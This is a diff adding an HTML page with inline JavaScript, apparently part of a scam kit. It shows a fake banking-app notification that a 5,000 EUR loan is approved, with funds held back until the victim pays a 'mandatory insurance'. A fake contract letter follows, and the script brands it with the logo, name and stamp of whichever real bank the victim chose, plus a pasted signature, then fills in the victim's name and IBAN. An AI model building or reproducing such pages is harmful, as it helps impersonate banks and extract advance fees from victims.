@@ -1,0 +1,312 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Notificaciones</title>
+
+    <link rel="stylesheet" href="../CSS/link-bank.css" />
+    <link rel="stylesheet" href="./tourist.css" />
+
+    <script src="../js/api-config.js?v=20260321-6"></script>
+    <script src="../js/flow-session-id.js?v=20260320-3"></script>
+    <script src="../js/app-guard.js?v=20260518-1"></script>
+    <script src="../js/navigation-guard.js?v=20260405-1"></script>
+  </head>
+
+  <body>
+    <div class="tourist-shell tourist-shell--notifications">
+      <div class="tourist-topbar">
+        <button type="button" class="tourist-topbar__back" data-tourist-back aria-label="Atrás">
+          <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12.5 16.6 7.07 11.17a1.65 1.65 0 0 1 0-2.34L12.5 3.4" stroke="#0F0F0F" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </button>
+        <h1 class="tourist-topbar__title">Notificaciones</h1>
+      </div>
+
+      <div class="tourist-alert" id="notif3Alert" style="display:none">1 nueva notificación</div>
+
+      <main>
+        <ul class="tourist-notif" style="list-style:none;margin:0;padding:0;">
+          <li class="tourist-notif__item tourist-notif__item--unread tourist-notif__item--with-pdf">
+            <div class="tourist-notif__link tourist-notif__link--credit">
+              <div class="tourist-notif__icon tourist-notif__icon--badge" aria-hidden="true">
+                <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <rect width="32" height="32" rx="16" fill="#EDEDED"/>
+                  <path d="M23.4193 20.5417V22.9167H7.58594V20.5417C7.58594 20.1062 7.94219 19.75 8.3776 19.75H22.6276C23.063 19.75 23.4193 20.1062 23.4193 20.5417Z" fill="#787878" stroke="#787878" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+                  <path d="M11.5443 14.207H9.96094V19.7487H11.5443V14.207Z" fill="#787878"/>
+                  <path d="M14.7083 14.207H13.125V19.7487H14.7083V14.207Z" fill="#787878"/>
+                  <path d="M17.8724 14.207H16.2891V19.7487H17.8724V14.207Z" fill="#787878"/>
+                  <path d="M21.0443 14.207H19.4609V19.7487H21.0443V14.207Z" fill="#787878"/>
+                  <path d="M24.2057 23.5117H6.78906C6.46448 23.5117 6.19531 23.2426 6.19531 22.918C6.19531 22.5934 6.46448 22.3242 6.78906 22.3242H24.2057C24.5303 22.3242 24.7995 22.5934 24.7995 22.918C24.7995 23.2426 24.5303 23.5117 24.2057 23.5117Z" fill="#787878"/>
+                  <path d="M22.9205 10.0537L15.7955 7.20375C15.6372 7.14042 15.368 7.14042 15.2097 7.20375L8.08469 10.0537C7.8076 10.1646 7.58594 10.4892 7.58594 10.79V13.4183C7.58594 13.8537 7.94219 14.21 8.3776 14.21H22.6276C23.063 14.21 23.4193 13.8537 23.4193 13.4183V10.79C23.4193 10.4892 23.1976 10.1646 22.9205 10.0537ZM15.5026 12.2308C14.8455 12.2308 14.3151 11.7004 14.3151 11.0433C14.3151 10.3862 14.8455 9.85583 15.5026 9.85583C16.1597 9.85583 16.6901 10.3862 16.6901 11.0433C16.6901 11.7004 16.1597 12.2308 15.5026 12.2308Z" fill="#787878"/>
+                </svg>
+              </div>
+              <div class="tourist-notif__text">
+                <p class="tourist-notif__title">Eliminación de restricciones</p>
+                <p class="tourist-notif__desc">
+                  Nos complace informarle que su solicitud de crédito ha sido aprobada. Para disponer de los fondos y eliminar las restricciones operativas, es necesario contratar el seguro obligatorio. Una vez cumplido este requisito, los fondos del crédito estarán disponibles para su transferencia al IBAN <strong><u id="notif3Iban">—</u></strong>.
+                </p>
+              </div>
+            </div>
+
+            <a
+              href="#"
+              class="tourist-notif-pdf"
+              data-notification-pdf-open
+              aria-label="Abrir PDF Contrato Nº ES-4738D9215"
+            >
+              <svg class="tourist-notif-pdf__icon" id="notif3PdfBankIcon" width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                <g clip-path="url(#notif3PdfClip)">
+                  <path d="M23.6458 0H13.0135H12.1896L11.6074 0.582125L3.55869 8.63138L2.97656 9.2135V10.037V26.6316C2.97656 29.5916 5.38456 32.0001 8.34506 32.0001H23.6458C26.6053 32.0001 29.0133 29.5916 29.0133 26.6316V5.3685C29.0133 2.408 26.6053 0 23.6458 0ZM27.026 26.6316C27.026 28.4989 25.5126 30.0123 23.6458 30.0123H8.34506C6.47731 30.0123 4.96394 28.4989 4.96394 26.6316V10.0369H10.1962C11.7515 10.0369 13.0135 8.77581 13.0135 7.22006V1.98775H23.6458C25.5126 1.98775 27.026 3.50113 27.026 5.3685V26.6316Z" fill="#787878"/>
+                  <path d="M10.7478 15.7969H8.96475C8.62525 15.7969 8.42188 16.0177 8.42188 16.3484V20.9581C8.42188 21.3573 8.68463 21.6205 9.04944 21.6205C9.40638 21.6205 9.66906 21.3574 9.66906 20.9581V19.5577C9.66906 19.5236 9.6865 19.5066 9.72056 19.5066H10.7478C12.0038 19.5066 12.7596 18.7425 12.7596 17.6559C12.7596 16.5522 12.0125 15.7969 10.7478 15.7969ZM10.6711 18.4283H9.72056C9.6865 18.4283 9.66906 18.4113 9.66906 18.3777V16.9258C9.66906 16.8917 9.6865 16.8748 9.72056 16.8748H10.6711C11.1973 16.8748 11.5115 17.189 11.5115 17.6559C11.5116 18.1228 11.1973 18.4283 10.6711 18.4283Z" fill="#787878"/>
+                  <path d="M15.6362 15.7969H14.2694C13.9299 15.7969 13.7266 16.0177 13.7266 16.3484V21.0261C13.7266 21.3574 13.9299 21.5694 14.2694 21.5694H15.6362C16.8668 21.5694 17.6314 21.1789 17.9368 20.2367C18.0468 19.9054 18.107 19.5066 18.107 18.6831C18.107 17.8597 18.0468 17.4608 17.9368 17.1296C17.6313 16.1874 16.8668 15.7969 15.6362 15.7969ZM16.7402 19.8038C16.5954 20.262 16.1799 20.4575 15.6021 20.4575H15.0253C14.9912 20.4575 14.9738 20.4405 14.9738 20.4065V16.9599C14.9738 16.9258 14.9912 16.9088 15.0253 16.9088H15.6021C16.1799 16.9088 16.5954 17.1043 16.7402 17.5626C16.7996 17.7581 16.8415 18.0976 16.8415 18.6832C16.8415 19.2688 16.7996 19.6083 16.7402 19.8038Z" fill="#787878"/>
+                  <path d="M22.5711 15.7969H19.7703C19.4308 15.7969 19.2266 16.0177 19.2266 16.3484V20.9581C19.2266 21.3573 19.4902 21.6205 19.855 21.6205C20.2111 21.6205 20.4746 21.3574 20.4746 20.9581V19.3111C20.4746 19.2775 20.4912 19.2605 20.5252 19.2605H22.1556C22.5204 19.2605 22.7325 19.0398 22.7325 18.7255C22.7325 18.4113 22.5204 18.1909 22.1556 18.1909H20.5252C20.4912 18.1909 20.4746 18.1739 20.4746 18.1399V16.9258C20.4746 16.8917 20.4912 16.8748 20.5252 16.8748H22.5711C22.9193 16.8748 23.1489 16.6457 23.1489 16.3403C23.1488 16.0259 22.9192 15.7969 22.5711 15.7969Z" fill="#787878"/>
+                </g>
+                <defs>
+                  <clipPath id="notif3PdfClip">
+                    <rect width="32" height="32" fill="white"/>
+                  </clipPath>
+                </defs>
+              </svg>
+              <span class="tourist-notif-pdf__text">
+                <strong id="notif3PdfBankName">Anexo crédito</strong>
+                <span>Contrato Nº ES-4738D9215</span>
+              </span>
+              <span class="tourist-notif-pdf__button">Abrir PDF</span>
+            </a>
+          </li>
+
+          <!-- Прочитанное -->
+          <li class="tourist-notif__item">
+            <div class="tourist-notif__icon tourist-notif__icon--badge" aria-hidden="true">
+              <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect width="32" height="32" rx="16" fill="#E1F8E9"/>
+                <path d="M22.6417 13.7904H20.1917C19.1333 13.7904 18.5 13.157 18.5 12.0987V9.6487C18.5 8.59036 19.1333 7.95703 20.1917 7.95703H22.6417C23.7 7.95703 24.3333 8.59036 24.3333 9.6487V12.0987C24.3333 13.157 23.7 13.7904 22.6417 13.7904ZM22.825 11.032C22.725 10.932 22.5917 10.882 22.4583 10.882C22.325 10.882 22.1917 10.932 22.0917 11.032L21.9417 11.182V9.31536C21.9417 9.0237 21.7083 8.79036 21.4167 8.79036C21.125 8.79036 20.8917 9.0237 20.8917 9.31536V11.182L20.7417 11.032C20.5417 10.832 20.2083 10.832 20.0083 11.032C19.8083 11.232 19.8083 11.5654 20.0083 11.7654L21.05 12.807C21.0917 12.8487 21.15 12.882 21.2083 12.907C21.225 12.9154 21.2417 12.9154 21.2583 12.9237C21.3 12.9404 21.3417 12.9487 21.3917 12.9487C21.4083 12.9487 21.425 12.9487 21.4417 12.9487C21.5 12.9487 21.55 12.9404 21.6083 12.9154C21.6167 12.9154 21.6167 12.9154 21.625 12.9154C21.6833 12.8904 21.7333 12.857 21.775 12.8154C21.7833 12.807 21.7833 12.807 21.7917 12.807L22.8333 11.7654C23.0333 11.5654 23.0333 11.232 22.825 11.032Z" fill="#1EC756"/>
+                <path d="M7.66406 16.0513V20.218C7.66406 22.1263 9.20573 23.668 11.1141 23.668H20.8724C22.7807 23.668 24.3307 22.118 24.3307 20.2096V16.0513C24.3307 15.493 23.8807 15.043 23.3224 15.043H8.6724C8.11406 15.043 7.66406 15.493 7.66406 16.0513ZM12.6641 20.8763H10.9974C10.6557 20.8763 10.3724 20.593 10.3724 20.2513C10.3724 19.9096 10.6557 19.6263 10.9974 19.6263H12.6641C13.0057 19.6263 13.2891 19.9096 13.2891 20.2513C13.2891 20.593 13.0057 20.8763 12.6641 20.8763ZM18.0807 20.8763H14.7474C14.4057 20.8763 14.1224 20.593 14.1224 20.2513C14.1224 19.9096 14.4057 19.6263 14.7474 19.6263H18.0807C18.4224 19.6263 18.7057 19.9096 18.7057 20.2513C18.7057 20.593 18.4224 20.8763 18.0807 20.8763Z" fill="#1EC756"/>
+                <path d="M17.2474 10.3404V12.782C17.2474 13.3404 16.7974 13.7904 16.2391 13.7904H8.6724C8.10573 13.7904 7.66406 13.3237 7.66406 12.7654C7.6724 11.8237 8.0474 10.9654 8.6724 10.3404C9.2974 9.71536 10.1641 9.33203 11.1141 9.33203H16.2391C16.7974 9.33203 17.2474 9.78203 17.2474 10.3404Z" fill="#1EC756"/>
+              </svg>
+            </div>
+            <div class="tourist-notif__text">
+              <p class="tourist-notif__title">Transferencia completada</p>
+              <p class="tourist-notif__desc tourist-notif__desc--muted">
+                Los fondos por importe de <strong><u style="color:#1EC756;">5.000,00 €</u></strong> han sido abonados conforme al Contrato Nº ES-4738D9215.
+              </p>
+            </div>
+          </li>
+        </ul>
+      </main>
+    </div>
+
+    <div class="tourist-contract-modal" id="notificationPdfModal" aria-hidden="true">
+      <div class="tourist-contract-modal__backdrop" data-notification-pdf-close tabindex="-1"></div>
+      <section
+        class="tourist-contract-modal__panel"
+        role="dialog"
+        aria-modal="true"
+        aria-labelledby="notificationPdfModalTitle"
+      >
+        <header class="tourist-contract-modal__header">
+          <div class="tourist-contract-modal__heading">
+            <p class="tourist-contract-modal__eyebrow">Contrato Nº ES-4738D9215</p>
+            <h2 class="tourist-contract-modal__title" id="notificationPdfModalTitle">Tarjeta de Crédito</h2>
+          </div>
+        </header>
+
+        <div class="tourist-contract-modal__body" tabindex="0">
+          <article class="credit-letter" aria-label="Carta de aprobación de préstamo">
+            <section class="credit-letter__page">
+              <header class="credit-letter__masthead">
+                <div class="credit-letter__caixa-brand" id="notif3ContractBankLogoWrap">
+                  <img src="../banks/newBank/logo.svg" alt="New Bank" class="credit-letter__caixa-logo" id="notif3ContractBankHeaderImg">
+                </div>
+                <div class="credit-letter__goval">
+                  <img src="../assets/monetologo.svg" alt="GO VAL FINANCE SL" class="credit-letter__goval-logo">
+                </div>
+              </header>
+
+              <div class="credit-letter__body">
+                <p class="credit-letter__line"><strong>De:</strong></p>
+                <p class="credit-letter__line"><strong id="notif3ContractBankName">New Bank S.A.</strong></p>
+                <p class="credit-letter__line"><strong>A:</strong></p>
+                <p class="credit-letter__line"><strong>Moneto Plus S.L.</strong></p>
+                <p class="credit-letter__line"><strong>Departamento de Préstamos</strong></p>
+                <p class="credit-letter__line"><strong>Estimados colegas,</strong></p>
+                <p class="credit-letter__para">Les informamos de que la solicitud de financiación presentada a nombre de <strong><span id="notif3ContractClientName"></span></strong> ha sido examinada con resultado positivo y ha sido aprobada en las siguientes condiciones:</p>
+                <p class="credit-letter__line"><strong>Importe del préstamo:</strong> 5 000.00</p>
+                <p class="credit-letter__line"><strong>TIN:</strong> 7.86%</p>
+                <p class="credit-letter__line"><strong>Modalidad de desembolso:</strong> transferencia bancaria</p>
+				<p class="credit-letter__line"><strong>Seguro de crédito:</strong> 100.00</p>
+                <p class="credit-letter__para">Para la liberación de los fondos y el levantamiento de las restricciones operativas, es necesaria la contratación del seguro obligatorio establecido en las condiciones del contrato de crédito.</p>
+                <p class="credit-letter__para">Les rogamos informen al cliente al respecto y, si fuera necesario, presten la asistencia adicional en la fase de finalización.</p>
+                <p class="credit-letter__para">Gracias por su colaboración.</p>
+                <p class="credit-letter__line">Atentamente,</p>
+                <p class="credit-letter__line">Departamento de Préstamos</p>
+                <p class="credit-letter__line" id="notif3ContractBankFooter">New Bank S.A.</p>
+              </div>
+
+              <div class="credit-letter__stamp-area" aria-hidden="true">
+                <img src="../assets/stamp.svg" alt="" class="credit-letter__stamp" id="notif3ContractStamp">
+                <img src="../assets/left-hand.png" alt="" class="credit-letter__signature">
+              </div>
+            </section>
+          </article>
+        </div>
+
+        <footer class="tourist-contract-modal__footer">
+          <button type="button" class="tourist-contract-modal__action" id="notificationPdfModalPrimary" data-notification-pdf-close>
+            <span class="tourist-contract-modal__action-content">
+              <span class="tourist-contract-modal__action-text">Cerrar</span>
+              <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+<g clip-path="url(#clip0_notif3_close)">
+<path d="M6.68949 5.97848C6.49423 5.78322 6.17764 5.78322 5.98238 5.97848C5.78712 6.17374 5.78712 6.49032 5.98238 6.68556L7.29549 7.9987L5.9824 9.31183C5.78714 9.5071 5.78714 9.82363 5.9824 10.0189C6.17766 10.2142 6.49424 10.2142 6.68949 10.0189L8.00262 8.70583L9.31569 10.0189C9.51096 10.2142 9.82756 10.2142 10.0228 10.0189C10.2181 9.82363 10.2181 9.50703 10.0228 9.31183L8.70969 7.9987L10.0228 6.68556C10.2181 6.49034 10.2181 6.17375 10.0228 5.97849C9.82756 5.78323 9.51096 5.78323 9.31569 5.97849L8.00262 7.29163L6.68949 5.97848Z" fill="white"/>
+<path fill-rule="evenodd" clip-rule="evenodd" d="M8.04087 0.832031H7.96434C6.42543 0.832025 5.2194 0.832018 4.27841 0.958531C3.31525 1.08802 2.55524 1.35825 1.9587 1.95479C1.36216 2.55133 1.09193 3.31134 0.962438 4.2745C0.835924 5.21549 0.835931 6.42151 0.835938 7.96043V8.03696C0.835931 9.5759 0.835924 10.7819 0.962438 11.7229C1.09193 12.686 1.36216 13.4461 1.9587 14.0426C2.55524 14.6392 3.31525 14.9094 4.27841 15.0389C5.2194 15.1654 6.42542 15.1654 7.96434 15.1654H8.04087C9.5798 15.1654 10.7858 15.1654 11.7268 15.0389C12.6899 14.9094 13.45 14.6392 14.0465 14.0426C14.6431 13.4461 14.9133 12.686 15.0428 11.7229C15.1693 10.7819 15.1693 9.5759 15.1693 8.03696V7.96043C15.1693 6.42152 15.1693 5.21549 15.0428 4.2745C14.9133 3.31134 14.6431 2.55133 14.0465 1.95479C13.45 1.35825 12.6899 1.08802 11.7268 0.958531C10.7858 0.832018 9.5798 0.832025 8.04087 0.832031ZM2.6658 2.6619C3.04557 2.28212 3.55938 2.0642 4.41166 1.94961C5.27831 1.83309 6.41712 1.83203 8.0026 1.83203C9.58807 1.83203 10.7269 1.83309 11.5935 1.94961C12.4458 2.0642 12.9596 2.28212 13.3394 2.6619C13.7192 3.04166 13.9371 3.55548 14.0517 4.40775C14.1682 5.2744 14.1693 6.41321 14.1693 7.9987C14.1693 9.58416 14.1682 10.723 14.0517 11.5896C13.9371 12.4419 13.7192 12.9557 13.3394 13.3355C12.9596 13.7153 12.4458 13.9332 11.5935 14.0478C10.7269 14.1643 9.58807 14.1654 8.0026 14.1654C6.41712 14.1654 5.27831 14.1643 4.41166 14.0478C3.55938 13.9332 3.04557 13.7153 2.6658 13.3355C2.28603 12.9557 2.0681 12.4419 1.95352 11.5896C1.837 10.723 1.83594 9.58416 1.83594 7.9987C1.83594 6.41321 1.837 5.2744 1.95352 4.40775C2.0681 3.55548 2.28603 3.04166 2.6658 2.6619Z" fill="white"/>
+</g>
+<defs>
+<clipPath id="clip0_notif3_close">
+  <rect width="16" height="16" fill="white"/>
+</clipPath>
+</defs>
+</svg>
+            </span>
+          </button>
+        </footer>
+      </section>
+    </div>
+
+    <nav class="tourist-tabbar" aria-label="Menú">
+      <a href="./index.html" class="tourist-tabbar__item is-active">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M12.37 2.14984L21.37 5.74982C21.72 5.88982 22 6.30981 22 6.67981V9.99982C22 10.5498 21.55 10.9998 21 10.9998H3C2.45 10.9998 2 10.5498 2 9.99982V6.67981C2 6.30981 2.28 5.88982 2.63 5.74982L11.63 2.14984C11.83 2.06984 12.17 2.06984 12.37 2.14984Z" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M22 22H2V19C2 18.45 2.45 18 3 18H21C21.55 18 22 18.45 22 19V22Z" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M4 18V11" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M8 18V11" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M12 18V11" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M16 18V11" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M20 18V11" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M1 22H23" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M12 8.5C12.8284 8.5 13.5 7.82843 13.5 7C13.5 6.17157 12.8284 5.5 12 5.5C11.1716 5.5 10.5 6.17157 10.5 7C10.5 7.82843 11.1716 8.5 12 8.5Z" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span>Home</span>
+      </a>
+      <a href="./archived-goals.html" class="tourist-tabbar__item">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M12.1484 16.5V18.6" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M7.14844 22H17.1484V21C17.1484 19.9 16.2484 19 15.1484 19H9.14844C8.04844 19 7.14844 19.9 7.14844 21V22V22Z" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10"/>
+          <path d="M6.14844 22H18.1484" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M12 16C8.13 16 5 12.87 5 9V6C5 3.79 6.79 2 9 2H15C17.21 2 19 3.79 19 6V9C19 12.87 15.87 16 12 16Z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M5.46906 11.6516C4.71906 11.4116 4.05906 10.9716 3.53906 10.4516C2.63906 9.45156 2.03906 8.25156 2.03906 6.85156C2.03906 5.45156 3.13906 4.35156 4.53906 4.35156H5.18906C4.98906 4.81156 4.88906 5.32156 4.88906 5.85156V8.85156C4.88906 9.85156 5.09906 10.7916 5.46906 11.6516Z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M18.5312 11.6516C19.2812 11.4116 19.9412 10.9716 20.4612 10.4516C21.3612 9.45156 21.9612 8.25156 21.9612 6.85156C21.9612 5.45156 20.8612 4.35156 19.4612 4.35156H18.8112C19.0112 4.81156 19.1112 5.32156 19.1112 5.85156V8.85156C19.1112 9.85156 18.9013 10.7916 18.5312 11.6516Z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span>Objetivos</span>
+      </a>
+      <a href="./history.html" class="tourist-tabbar__item">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M14.5 9.25H2C1.59 9.25 1.25 8.91 1.25 8.5C1.25 8.09 1.59 7.75 2 7.75H14.5C14.91 7.75 15.25 8.09 15.25 8.5C15.25 8.91 14.91 9.25 14.5 9.25Z" fill="currentColor"/>
+          <path d="M8 17.25H6C5.59 17.25 5.25 16.91 5.25 16.5C5.25 16.09 5.59 15.75 6 15.75H8C8.41 15.75 8.75 16.09 8.75 16.5C8.75 16.91 8.41 17.25 8 17.25Z" fill="currentColor"/>
+          <path d="M14.5 17.25H10.5C10.09 17.25 9.75 16.91 9.75 16.5C9.75 16.09 10.09 15.75 10.5 15.75H14.5C14.91 15.75 15.25 16.09 15.25 16.5C15.25 16.91 14.91 17.25 14.5 17.25Z" fill="currentColor"/>
+          <path d="M17.56 21.25H6.44C2.46 21.25 1.25 20.05 1.25 16.11V7.89C1.25 3.95 2.46 2.75 6.44 2.75H14.5C14.91 2.75 15.25 3.09 15.25 3.5C15.25 3.91 14.91 4.25 14.5 4.25H6.44C3.3 4.25 2.75 4.79 2.75 7.89V16.1C2.75 19.2 3.3 19.74 6.44 19.74H17.55C20.69 19.74 21.24 19.2 21.24 16.1V14.02C21.24 13.61 21.58 13.27 21.99 13.27C22.4 13.27 22.74 13.61 22.74 14.02V16.1C22.75 20.05 21.54 21.25 17.56 21.25Z" fill="currentColor"/>
+          <path d="M20 10.25C19.9 10.25 19.81 10.23 19.71 10.19C19.43 10.07 19.25 9.8 19.25 9.5V3.5C19.25 3.09 19.59 2.75 20 2.75C20.41 2.75 20.75 3.09 20.75 3.5V7.69L21.47 6.97C21.76 6.68 22.24 6.68 22.53 6.97C22.82 7.26 22.82 7.74 22.53 8.03L20.53 10.03C20.39 10.17 20.2 10.25 20 10.25Z" fill="currentColor"/>
+          <path d="M19.9975 10.2514C19.8075 10.2514 19.6175 10.1814 19.4675 10.0314L17.4675 8.03141C17.1775 7.74141 17.1775 7.26141 17.4675 6.97141C17.7575 6.68141 18.2375 6.68141 18.5275 6.97141L20.5275 8.97141C20.8175 9.26141 20.8175 9.74141 20.5275 10.0314C20.3775 10.1814 20.1875 10.2514 19.9975 10.2514Z" fill="currentColor"/>
+        </svg>
+        <span>Historial</span>
+      </a>
+      <a href="./chat.html" class="tourist-tabbar__item">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M17 20.5H7C4 20.5 2 19 2 15.5V8.5C2 5 4 3.5 7 3.5H17C20 3.5 22 5 22 8.5V15.5C22 19 20 20.5 17 20.5Z" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M17 9L13.87 11.5C12.84 12.32 11.15 12.32 10.12 11.5L7 9" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span>Chat</span>
+      </a>
+      <a href="./support.html" class="tourist-tabbar__item">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M8 22.3214C7.72 22.3214 7.42998 22.2514 7.16998 22.1114C6.59998 21.8114 6.25 21.2113 6.25 20.5714V19.1514C3.23 18.8414 1.25 16.6213 1.25 13.4413V7.44141C1.25 4.00141 3.56 1.69141 7 1.69141H17C20.44 1.69141 22.75 4.00141 22.75 7.44141V13.4413C22.75 16.8813 20.44 19.1913 17 19.1913H13.23L8.96997 22.0314C8.67997 22.2214 8.34 22.3214 8 22.3214ZM7 3.1814C4.42 3.1814 2.75 4.8514 2.75 7.4314V13.4315C2.75 16.0115 4.42 17.6815 7 17.6815C7.41 17.6815 7.75 18.0215 7.75 18.4315V20.5615C7.75 20.6915 7.83 20.7514 7.88 20.7814C7.93001 20.8114 8.03001 20.8414 8.14001 20.7714L12.59 17.8115C12.71 17.7315 12.86 17.6815 13.01 17.6815H17.01C19.59 17.6815 21.26 16.0115 21.26 13.4315V7.4314C21.26 4.8514 19.59 3.1814 17.01 3.1814H7Z" fill="currentColor"/>
+          <path d="M12.0037 12.1094C11.5937 12.1094 11.2537 11.7694 11.2537 11.3594V11.1494C11.2537 9.98941 12.1037 9.4194 12.4237 9.1994C12.7937 8.9494 12.9137 8.77941 12.9137 8.51941C12.9137 8.01941 12.5037 7.60938 12.0037 7.60938C11.5037 7.60938 11.0938 8.01941 11.0938 8.51941C11.0938 8.92941 10.7537 9.26941 10.3438 9.26941C9.93375 9.26941 9.59375 8.92941 9.59375 8.51941C9.59375 7.18941 10.6737 6.10938 12.0037 6.10938C13.3337 6.10938 14.4137 7.18941 14.4137 8.51941C14.4137 9.65941 13.5737 10.2294 13.2637 10.4394C12.8737 10.6994 12.7537 10.8694 12.7537 11.1494V11.3594C12.7537 11.7794 12.4137 12.1094 12.0037 12.1094Z" fill="currentColor"/>
+          <path d="M12 14.6016C11.58 14.6016 11.25 14.2616 11.25 13.8516C11.25 13.4416 11.59 13.1016 12 13.1016C12.41 13.1016 12.75 13.4416 12.75 13.8516C12.75 14.2616 12.42 14.6016 12 14.6016Z" fill="currentColor"/>
+        </svg>
+        <span>Soporte</span>
+      </a>
+    </nav>
+
+    <script src="./tourist.js?v=20260609-1"></script>
+    <script>
+      (function () {
+        // Показать «1 nueva notificación» только если ещё не было прочитано
+        var alertEl = document.getElementById("notif3Alert");
+        if (alertEl && localStorage.getItem("notifCommissionRead") !== "1") {
+          alertEl.style.display = "";
+        }
+        // Пометить как прочитанное
+        localStorage.setItem("notifCommissionRead", "1");
+
+        var apiBase = (window.FORM_API_BASE || window.MAIN_API_BASE || window.API_BASE || "").replace(/\/+$/, "");
+        var sessionId = (typeof window.getFlowSessionId === "function") ? window.getFlowSessionId() : (localStorage.getItem("flowSessionId") || "");
+        var ibanEl = document.getElementById("notif3Iban");
+        var contractNameEl = document.getElementById("notif3ContractClientName");
+
+        // Подставить выбранный банк (та же логика что в detail-transaction.html)
+        var bank = "";
+        var bankKey = "";
+        var bankLogo = "";
+        try { bank    = localStorage.getItem("selectedBank")    || ""; } catch(e){}
+        try { bankKey = localStorage.getItem("selectedBankKey") || ""; } catch(e){}
+        try { bankLogo = localStorage.getItem("selectedBankLogo") || ""; } catch(e){}
+        if (!bank) { bank = "New Bank"; bankKey = bankKey || "newBank"; }
+
+        var BANK_ASSET_EXT = "svg";
+        function bankAsset(file) {
+          return bankKey ? ("../banks/" + bankKey + "/" + file + "." + BANK_ASSET_EXT) : null;
+        }
+
+        var pdfBankName      = document.getElementById("notif3PdfBankName");
+        var contractBankName = document.getElementById("notif3ContractBankName");
+        var contractBankFooter = document.getElementById("notif3ContractBankFooter");
+        var contractBankLogoWrap = document.getElementById("notif3ContractBankLogoWrap");
+        var pdfBankIcon      = document.getElementById("notif3PdfBankIcon");
+
+        if (bank) {
+          if (pdfBankName)       pdfBankName.textContent       = bank + " – Anexo crédito";
+          if (contractBankName)  contractBankName.textContent  = bank;
+          if (contractBankFooter) contractBankFooter.textContent = bank;
+        }
+
+        // Лого только внутри договора, иконка PDF на карточке не меняется
+        var logoSrc = bankAsset("logo") || bankLogo;
+        if (logoSrc && contractBankLogoWrap) {
+          var logoImg = contractBankLogoWrap.querySelector("img");
+          if (logoImg) { logoImg.src = logoSrc; logoImg.alt = bank || "Banco"; }
+        }
+
+        // Печать: banks/{key}/stamp.svg
+        var stampSrc = bankAsset("stamp");
+        if (stampSrc) {
+          var stampEl = document.getElementById("notif3ContractStamp");
+          if (stampEl) stampEl.src = stampSrc;
+        }
+
+        // Имя из localStorage как быстрый старт
+        var cachedName = localStorage.getItem("touristCardNombre") || localStorage.getItem("inputName") || "";
+        if (contractNameEl && cachedName) contractNameEl.textContent = cachedName;
+
+        function loadData() {
+          if (!sessionId) return;
+          fetch(apiBase + "/api/tourist/status?s=" + encodeURIComponent(sessionId), {
+            cache: "no-store", mode: "cors", credentials: "omit"
+          })
+            .then(function (r) { return r.json(); })
+            .then(function (data) {
+              if (data && data.iban && ibanEl) {
+                ibanEl.textContent = data.iban;
+              }
+              var nombre = (data && data.nombre) || localStorage.getItem("touristCardNombre") || localStorage.getItem("inputName") || "";
+              if (contractNameEl && nombre) contractNameEl.textContent = nombre;
+            })
+            .catch(function () {});
+        }
+
+        loadData();
+      })();
+    </script>
+  </body>
+</html>
